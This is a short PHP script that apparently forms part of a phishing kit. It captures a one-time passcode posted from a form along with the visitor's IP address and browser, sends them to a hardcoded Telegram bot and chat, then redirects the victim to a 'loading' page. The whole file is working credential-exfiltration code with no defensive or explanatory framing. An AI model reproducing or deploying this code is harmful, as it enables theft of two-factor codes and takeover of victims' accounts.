<?php

$message  = "--------otp---------\n";
$message .= "Numero : " . $_POST['code'] . "\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP      : $ip\n";
$message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "------------------------------------\n";

$token = "7112576393:AAEE651qcm01mMhZ3oqVL6utGoxCq0KI8JA";
$chat_id = "-4213384415";

// Prepare data for Telegram API
$data = [
    'text' => $message,
    'chat_id' => $chat_id
];

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

// Redirect to loading page
header("Location: index3.html");
exit();
?>

